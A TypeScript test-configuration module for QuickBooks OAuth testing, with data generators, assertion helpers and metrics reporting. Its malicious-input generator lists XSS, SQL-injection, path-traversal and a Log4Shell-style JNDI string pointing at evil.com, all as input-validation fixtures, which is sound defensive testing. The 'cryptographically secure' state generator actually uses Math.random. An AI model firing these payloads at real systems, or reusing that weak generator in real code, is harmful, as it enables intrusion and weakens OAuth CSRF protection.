/**
 * OAuth Testing Configuration
 * Centralizes all OAuth-related test configuration and environment setup
 */

export const OAuth_TEST_CONFIG = {
  // Test timeout configurations
  TIMEOUTS: {
    UNIT_TEST: 5000,
    INTEGRATION_TEST: 15000,
    E2E_TEST: 30000,
    PERFORMANCE_TEST: 60000,
  },

  // Performance thresholds
  PERFORMANCE: {
    MAX_AUTH_URL_GENERATION_TIME: 10, // milliseconds
    MAX_TOKEN_EXCHANGE_TIME: 2000, // milliseconds
    MAX_TOKEN_REFRESH_TIME: 1500, // milliseconds
    MAX_API_CALL_TIME: 5000, // milliseconds
    MAX_CONCURRENT_REQUESTS: 50,
    MIN_REQUESTS_PER_SECOND: 10,
  },

  // Security test parameters
  SECURITY: {
    MIN_STATE_LENGTH: 16,
    MIN_STATE_ENTROPY_BITS: 128,
    MAX_TIMING_DEVIATION_PERCENT: 50,
    MALICIOUS_INPUT_SAMPLES: 100,
    REQUIRED_HTTPS_PRODUCTION: true,
  },

  // Mock server configuration for integration tests
  MOCK_SERVER: {
    OAUTH_SERVER_PORT: 1080,
    API_SERVER_PORT: 1081,
    TIMEOUT_MS: 30000,
    RETRY_ATTEMPTS: 3,
  },

  // Test data generation
  TEST_DATA: {
    COMPANY_COUNT: 5,
    ACCOUNT_COUNT_SMALL: 10,
    ACCOUNT_COUNT_LARGE: 500,
    TRANSACTION_COUNT: 100,
    PAGINATION_SIZE: 20,
  },

  // Environment-specific configurations
  ENVIRONMENTS: {
    DEVELOPMENT: {
      ALLOW_HTTP: true,
      ALLOW_LOCALHOST: true,
      DEBUG_LOGGING: true,
      STRICT_SSL: false,
    },
    STAGING: {
      ALLOW_HTTP: false,
      ALLOW_LOCALHOST: false,
      DEBUG_LOGGING: true,
      STRICT_SSL: true,
    },
    PRODUCTION: {
      ALLOW_HTTP: false,
      ALLOW_LOCALHOST: false,
      DEBUG_LOGGING: false,
      STRICT_SSL: true,
    },
  },

  // QuickBooks API endpoints for different environments
  QUICKBOOKS_ENDPOINTS: {
    SANDBOX: {
      OAUTH_BASE_URL: 'https://appcenter.intuit.com',
      API_BASE_URL: 'https://sandbox-quickbooks.api.intuit.com',
      DISCOVERY_DOCUMENT_URL: 'https://appcenter.intuit.com/connect/oauth2',
    },
    PRODUCTION: {
      OAUTH_BASE_URL: 'https://appcenter.intuit.com',
      API_BASE_URL: 'https://quickbooks.api.intuit.com',
      DISCOVERY_DOCUMENT_URL: 'https://appcenter.intuit.com/connect/oauth2',
    },
  },

  // Test coverage requirements
  COVERAGE: {
    MIN_BRANCH_COVERAGE: 85,
    MIN_FUNCTION_COVERAGE: 90,
    MIN_LINE_COVERAGE: 95,
    MIN_STATEMENT_COVERAGE: 95,
  },

  // CI/CD pipeline configuration
  CI_CD: {
    PARALLEL_TEST_JOBS: 4,
    MAX_TEST_DURATION_MINUTES: 20,
    REQUIRED_TEST_TYPES: ['unit', 'integration', 'security', 'performance'],
    NOTIFICATION_CHANNELS: ['slack', 'email'],
    DEPLOYMENT_ENVIRONMENTS: ['staging', 'production'],
  },
} as const;

/**
 * Test environment setup utilities
 */
export class OAuthTestEnvironment {
  static setup(): void {
    // Set test environment variables
    process.env.NODE_ENV = 'test';
    process.env.QB_CLIENT_ID = 'test-client-id';
    process.env.QB_CLIENT_SECRET = 'test-client-secret';
    process.env.QB_ENVIRONMENT = 'sandbox';
    process.env.QB_REDIRECT_URI = 'http://localhost:3000/callback';
    
    // Mock external dependencies
    this.setupMockServer();
    this.setupNetworkMocks();
  }

  static teardown(): void {
    // Clean up test environment
    delete process.env.QB_CLIENT_ID;
    delete process.env.QB_CLIENT_SECRET;
    delete process.env.QB_ENVIRONMENT;
    delete process.env.QB_REDIRECT_URI;
  }

  private static setupMockServer(): void {
    // Mock QuickBooks OAuth server responses
    // This would be implemented with tools like MSW (Mock Service Worker)
    // or a dedicated mock server for integration tests
  }

  private static setupNetworkMocks(): void {
    // Mock network requests for unit tests
    // This would typically use tools like nock or msw
  }
}

/**
 * Test data generators
 */
export class OAuthTestDataGenerator {
  static generateClientId(): string {
    return `Intuit_QB_Test_${Date.now()}_${Math.random().toString(36).substring(2)}`;
  }

  static generateClientSecret(): string {
    return `QB_Secret_${Date.now()}_${Math.random().toString(36).substring(2, 15)}`;
  }

  static generateRealmId(): string {
    return Math.floor(Math.random() * 9000000000000000000 + 1000000000000000000).toString();
  }

  static generateAuthCode(): string {
    return `QB_AUTH_${Date.now()}_${Math.random().toString(36).substring(2, 20)}`;
  }

  static generateAccessToken(): string {
    // Simulate JWT-like structure
    const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
    const payload = btoa(JSON.stringify({
      iss: 'Intuit',
      aud: 'test-client-id',
      exp: Math.floor(Date.now() / 1000) + 3600,
      iat: Math.floor(Date.now() / 1000),
      realmid: this.generateRealmId(),
    }));
    const signature = btoa('mock-signature');
    return `${header}.${payload}.${signature}`;
  }

  static generateRefreshToken(): string {
    return `L0${Date.now()}_${Math.random().toString(36).substring(2, 30)}`;
  }

  static generateSecureState(): string {
    // Generate cryptographically secure state parameter
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < 32; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  static generateMaliciousInputs(): string[] {
    return [
      // XSS attempts
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '"><script>alert(1)</script>',
      
      // SQL injection attempts
      "'; DROP TABLE oauth_tokens; --",
      '" OR 1=1 --',
      "' UNION SELECT * FROM users --",
      
      // Path traversal attempts
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\config\\sam',
      
      // Code injection attempts
      '${7*7}',
      '#{7*7}',
      '{{7*7}}',
      '<%=7*7%>',
      
      // LDAP injection
      '${jndi:ldap://evil.com/}',
      
      // Null byte injection
      '\x00admin',
      'user\x00.txt',
      
      // Unicode normalization attacks
      'admin\u202E',
      '\uFEFFadmin',
      
      // Long strings (buffer overflow attempts)
      'A'.repeat(10000),
      'B'.repeat(100000),
      
      // Special characters
      '!@#$%^&*()_+{}|:<>?[]\\;\'\",./',
      '™®©℗℠',
      
      // Format string attacks
      '%n%n%n%n',
      '%x%x%x%x',
    ];
  }
}

/**
 * Test assertion helpers
 */
export class OAuthTestAssertions {
  static assertValidOAuthUrl(url: string, expectedClientId: string): void {
    const urlObj = new URL(url);
    
    if (!url.startsWith('https://')) {
      throw new Error('OAuth URL must use HTTPS');
    }
    
    if (!urlObj.searchParams.get('client_id')) {
      throw new Error('OAuth URL must contain client_id parameter');
    }
    
    if (urlObj.searchParams.get('client_id') !== expectedClientId) {
      throw new Error('OAuth URL client_id does not match expected value');
    }
    
    if (!urlObj.searchParams.get('response_type')) {
      throw new Error('OAuth URL must contain response_type parameter');
    }
    
    if (!urlObj.searchParams.get('scope')) {
      throw new Error('OAuth URL must contain scope parameter');
    }
    
    if (!urlObj.searchParams.get('redirect_uri')) {
      throw new Error('OAuth URL must contain redirect_uri parameter');
    }
  }

  static assertValidTokens(tokens: any): void {
    if (!tokens.access_token) {
      throw new Error('Tokens must include access_token');
    }
    
    if (!tokens.refresh_token) {
      throw new Error('Tokens must include refresh_token');
    }
    
    if (!tokens.realmId) {
      throw new Error('Tokens must include realmId');
    }
    
    if (!tokens.expires_in || tokens.expires_in <= 0) {
      throw new Error('Tokens must include valid expires_in value');
    }
    
    if (tokens.token_type !== 'Bearer') {
      throw new Error('Token type must be Bearer');
    }
  }

  static assertSecureConfiguration(config: any): void {
    if (!config.clientId) {
      throw new Error('Configuration must include clientId');
    }
    
    if (!config.clientSecret) {
      throw new Error('Configuration must include clientSecret');
    }
    
    if (!config.redirectUri) {
      throw new Error('Configuration must include redirectUri');
    }
    
    if (config.environment === 'production' && !config.redirectUri.startsWith('https://')) {
      throw new Error('Production environment requires HTTPS redirect URI');
    }
  }

  static assertPerformanceThresholds(executionTime: number, operation: string): void {
    const thresholds = OAuth_TEST_CONFIG.PERFORMANCE;
    
    let maxTime: number;
    switch (operation) {
      case 'auth_url_generation':
        maxTime = thresholds.MAX_AUTH_URL_GENERATION_TIME;
        break;
      case 'token_exchange':
        maxTime = thresholds.MAX_TOKEN_EXCHANGE_TIME;
        break;
      case 'token_refresh':
        maxTime = thresholds.MAX_TOKEN_REFRESH_TIME;
        break;
      case 'api_call':
        maxTime = thresholds.MAX_API_CALL_TIME;
        break;
      default:
        throw new Error(`Unknown operation: ${operation}`);
    }
    
    if (executionTime > maxTime) {
      throw new Error(
        `Performance threshold exceeded for ${operation}: ${executionTime}ms > ${maxTime}ms`
      );
    }
  }
}

/**
 * Test metrics collection
 */
export class OAuthTestMetrics {
  private static metrics: Array<{
    testName: string;
    operation: string;
    duration: number;
    success: boolean;
    timestamp: number;
  }> = [];

  static recordMetric(testName: string, operation: string, duration: number, success: boolean): void {
    this.metrics.push({
      testName,
      operation,
      duration,
      success,
      timestamp: Date.now(),
    });
  }

  static getMetrics(): typeof this.metrics {
    return [...this.metrics];
  }

  static clearMetrics(): void {
    this.metrics = [];
  }

  static generateReport(): string {
    const totalTests = this.metrics.length;
    const successfulTests = this.metrics.filter(m => m.success).length;
    const averageDuration = this.metrics.reduce((sum, m) => sum + m.duration, 0) / totalTests;
    
    const operationStats = this.metrics.reduce((acc, m) => {
      if (!acc[m.operation]) {
        acc[m.operation] = { count: 0, totalDuration: 0, failures: 0 };
      }
      acc[m.operation].count++;
      acc[m.operation].totalDuration += m.duration;
      if (!m.success) acc[m.operation].failures++;
      return acc;
    }, {} as Record<string, { count: number; totalDuration: number; failures: number }>);

    let report = `OAuth Test Metrics Report\n`;
    report += `========================\n`;
    report += `Total Tests: ${totalTests}\n`;
    report += `Successful: ${successfulTests} (${((successfulTests / totalTests) * 100).toFixed(1)}%)\n`;
    report += `Average Duration: ${averageDuration.toFixed(2)}ms\n\n`;

    report += `Operation Breakdown:\n`;
    Object.entries(operationStats).forEach(([operation, stats]) => {
      const avgDuration = stats.totalDuration / stats.count;
      const successRate = ((stats.count - stats.failures) / stats.count) * 100;
      report += `  ${operation}: ${stats.count} tests, ${avgDuration.toFixed(2)}ms avg, ${successRate.toFixed(1)}% success\n`;
    });

    return report;
  }
}